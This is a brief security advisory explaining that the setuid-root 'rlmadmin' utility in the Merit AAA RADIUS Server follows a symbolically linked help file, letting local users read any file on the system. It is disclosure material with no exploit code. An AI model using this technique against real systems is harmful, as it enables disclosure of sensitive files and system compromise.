The 'rlmadmin' user management utility included with the Merit AAA RADIUS Server package is susceptible to a trivial symbolic link attack. The program allows users to specify a directory from which configuration files should be loaded at runtime. A help file, 'rlmadmin.help', is loaded from this directory and displayed directly to the user when the program is run.

The vulnerability exists because the program is setuid root and does not check if the help file is symbolically linked before displaying its contents to the user. As a local user, it is trivial for a local user to read any file on the system. This may lead to the disclosure of sensitive data and system compromise.
